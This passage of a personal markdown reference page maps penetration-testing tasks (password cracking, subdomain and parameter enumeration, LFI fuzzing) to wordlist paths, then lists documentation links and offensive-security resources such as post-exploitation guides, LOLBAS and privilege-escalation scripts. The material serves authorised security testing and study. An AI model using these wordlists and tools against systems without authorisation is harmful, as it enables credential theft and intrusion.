    *   **Use for:** Web login forms, SSH, FTP, and other online attacks

#### Offline Hash Cracking (John, Hashcat)
*   **Primary:** `/usr/share/wordlists/rockyou.txt`
    *   **Note:** Decompress first with `sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`
    *   **Why:** Massive and comprehensive. Perfect for offline cracking where speed isn't network-limited

### 🌐 Subdomain Enumeration (ffuf, gobuster vhost)
*   **Best All-Around:** `/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
*   **Fast Recon:** `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

### 👤 Username Enumeration
*   **Common Names:** `/usr/share/seclists/Usernames/Names/names.txt`
*   **General Shortlist:** `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
*   **Default Credentials:** `/usr/share/seclists/Usernames/cirt-default-usernames.txt`

### 🔍 Parameter Enumeration (ffuf)
*   **Find Hidden GET Parameters:** `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`
    *   Common parameter names (id, user, page, debug, etc.)

### 🎯 LFI Vulnerability Testing (ffuf, Burp Intruder)
*   **LFI Payloads:** `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`
    *   Contains LFI payloads (../../, ....//, etc.), not just words

## 📄 Report Templates

- [Cybersecurity Style Guide V1.1 - Bishop-Fox-Cybersecurity-Style-Guide.pdf](https://s3.us-east-2.amazonaws.com/s3.bishopfox.com/prod-1437/Documents/Guides/Bishop-Fox-Cybersecurity-Style-Guide.pdf)
- [Ghostwriter: The SpecterOps project management and reporting engine](https://github.com/GhostManager/Ghostwriter)

## 🛠️ **The Docs**

## ⚙️ Ansible

- [Ansible Configuration Settings (environment variables)](https://docs.ansible.com/ansible/latest/reference_appendices/config.html)
- [Jinja Documentation](https://jinja.palletsprojects.com/)
- [Jinja Template Designed Documentation](https://jinja.palletsprojects.com/templates/)

## 📦 Vagrant

- [Vagrant Docs](https://www.vagrantup.com/docs)
- [Vagrant Boxes](https://app.vagrantup.com/boxes/search)

## 🧰 Packer

- [Windows Templates for Packer](https://github.com/StefanScherer/packer-windows)  
  - Windows 11, 10, Server 2022/2019/2016, also with Docker
- [Debugging Packer](https://www.packer.io/docs/debugging)
- [Contextual Variables (in the build)](https://www.packer.io/docs/templates/hcl_templates/contextual-variables)
- [Path Variables](https://www.packer.io/docs/templates/hcl_templates/path-variables)
- [Template Engine](https://www.packer.io/docs/templates/legacy_json_templates/engine)
- [Packer Env Vars](https://www.packer.io/docs/configure)

## 🐳 Docker

- [Docker Docs](https://docs.docker.com/engine/)
- [Docker Hub](https://hub.docker.com/search?type=image)
- [(Docker) Dockerfile Reference](https://docs.docker.com/engine/reference/builder/)
- [(Docker) Compose Specification](https://docs.docker.com/compose/compose-file/)

## 🐍 Python

- [Python3 Docs](https://docs.python.org/3/index.html)
- [Python3 Default Exceptions](https://docs.python.org/3/library/exceptions.html#exception-hierarchy)
- [Python Code Search](https://www.programcreek.com/python/)
- [Sphinx (Python3) Docstring](https://sphinx-rtd-tutorial.readthedocs.io/en/latest/docstrings.html)
- [(eBook) Learn Python the Hard Way](https://learnpythonthehardway.org/python3/)
- [Selenium w/ Python Docs](https://selenium-python.readthedocs.io/)
- [Selenium WebDriver](https://www.selenium.dev/documentation/en/webdriver/)

## 📝 Cheatsheets / Quick References

- [Bash cheatsheet](https://devhints.io/bash) | [Bash Colors](https://www.shellhacks.com/bash-colors/)
- [Vim cheatsheet](https://devhints.io/vim) | [Vim scripting cheatsheet](https://devhints.io/vimscript)
- [Tmux Cheat Sheet & Quick Reference](https://tmuxcheatsheet.com/)
- [Regex Tester and Debugger (Online)](https://www.regextester.com/)
- [SANS Cyber Security Posters/Cheatsheets](https://www.sans.org/posters/?msc=securityresourceslp)

## 🌐 Good Stuff™

- [BROWSERS: WHICH ONE TO CHOOSE?](https://magusz.neocities.org/browsers.html)
- [Running Windows 10 on Linux using KVM with VGA Passthrough - Heiko's Blog](https://heiko-sieger.info/running-windows-10-on-linux-using-kvm-with-vga-passthrough/#Part_1_Hardware_Requirements)
- [Arch boot process - ArchWiki](https://wiki.archlinux.org/index.php/Arch_boot_process)

## 🔒 Security

- [How to Stay Up-to-Date on Security Trends](https://securityintelligence.com/how-to-stay-up-to-date-on-security-trends/)
- [Networking Cheatsheets](http://packetlife.net/library/cheat-sheets/)
- [HTML CheatSheet](http://htmlcheatsheet.com/)
- [Krebs on Security](http://krebsonsecurity.com/)
- [NetSec Focus](https://mm.netsecfocus.com/nsf/channels/town-square)
- [Security Week](https://www.securityweek.com/)

- [ArchWiki](https://wiki.archlinux.org/)
- [Arch Package Search](https://archlinux.org/packages/)
- [Manjaro - How to provide good info](https://forum.manjaro.org/t/how-to-provide-good-information/874)

- [KeePassXC Docs](https://keepassxc.org/docs/KeePassXC_GettingStarted.html#_overview)
- [i3 Docs](https://i3wm.org/docs/userguide.html)
- [Spaceship-Prompt Options](https://spaceship-prompt.sh/options/)
- [neovim (Nvim) Docs](https://neovim.io/doc/user/)
- [Torrenting Blocklists](https://greycoder.com/the-best-blocklist-for-torrents/)
- [Borg Backup Docs](https://borgbackup.readthedocs.io/en/stable/)
- [GRUB Manual](https://www.gnu.org/software/grub/manual/grub/html_node/Simple-configuration.html)
- [Writing a proper GitHub issue](https://medium.com/nyc-planning-digital/writing-a-proper-github-issue-97427d62a20)
- [Searching code - GitHub Docs](https://docs.github.com/en/search-github/searching-on-github/searching-code)

- [Windows Post-Exploitation Resources](https://github.com/emilyanncr/Windows-Post-Exploitation)
- [(Windows Survey) Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md)
- [Pentesting: Tricks for penetration testing](https://github.com/kmkz/Pentesting)
- [Awesome tools to exploit Windows!](https://github.com/Hack-with-Github/Windows)
- [Living Off The Land Binaries, Scripts and Libraries](https://lolbas-project.github.io/#)
- [File Transfers Cheat Sheet by fred](https://cheatography.com/fred/cheat-sheets/file-transfers/)
- [Public PenTest Report Examples](https://pentestreports.com/reports/)
- [MITRE ATT&CK®](https://attack.mitre.org/)
- [Registry RegRipper](https://resources.infosecinstitute.com/topic/registry-forensics-regripper-command-line-linux/)
- [OSCP-Exam-Report-Template-Markdown](https://github.com/noraj/OSCP-Exam-Report-Template-Markdown)
- [SecLists: The security tester's companion](https://github.com/danielmiessler/SecLists)
- [Other Big References - HackTricks](https://book.hacktricks.xyz/todo/references)
- [A guide for windows penetration testing - Rogue Security](https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/)
- [HackTricks - HackTricks](https://book.hacktricks.xyz/welcome/readme)
- [Passwords - SkullSecurity](https://wiki.skullsecurity.org/index.php/Passwords)
- [NTLM: How does the authentication protocol work? - IONOS](https://www.ionos.com/digitalguide/server/know-how/ntlm-nt-lan-manager/)
- [CertCube Labs - Blog On Advance InfoSec Concepts](https://blog.certcube.com/)
- [Impacket: Python classes for working with network protocols](https://github.com/SecureAuthCorp/impacket)
- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/PEASS-ng)
- [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
- [How to convert flat raw disk image to vmdk for virtualbox or vmplayer? - Stack Overflow](https://stackoverflow.com/questions/454899/how-to-convert-flat-raw-disk-image-to-vmdk-for-virtualbox-or-vmplayer)
- [How to extract forensic artifacts from pagefile.sys? | Andrea Fortuna](https://andreafortuna.org/2019/04/17/how-to-extract-forensic-artifacts-from-pagefile-sys/)
- [windows-binary-tools: Useful binaries for Windows](https://github.com/arizvisa/windows-binary-tools)
- [Techniques - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/enterprise/)
- [Dr Josh Stroschein - YouTube](https://www.youtube.com/@jstrosch/videos)